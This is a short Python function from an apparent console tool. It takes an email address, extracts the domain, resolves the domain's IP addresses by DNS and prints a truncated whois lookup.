def cmd_email_recon(ctx):
    email = ctx["ask"]("Email", "")
    if not email or "@" not in email:
        ctx["console"].print(f"[{ctx['theme'].danger}]Invalid email.[/]")
        return
    domain = email.split("@", 1)[1]
    ctx["console"].print(f"Domain: {domain}")
    try:
        ips = sorted({i[4][0] for i in socket.getaddrinfo(domain, None)})
        ctx["console"].print(f"Resolved IPs: {', '.join(ips)}")
    except socket.gaierror as exc:
        ctx["console"].print(f"DNS lookup failed: {exc}")
    code, out, _ = _safe_run(["whois", domain], timeout=8)
    if code == 0:
        ctx["console"].print(out.split("source")[0][:1500])


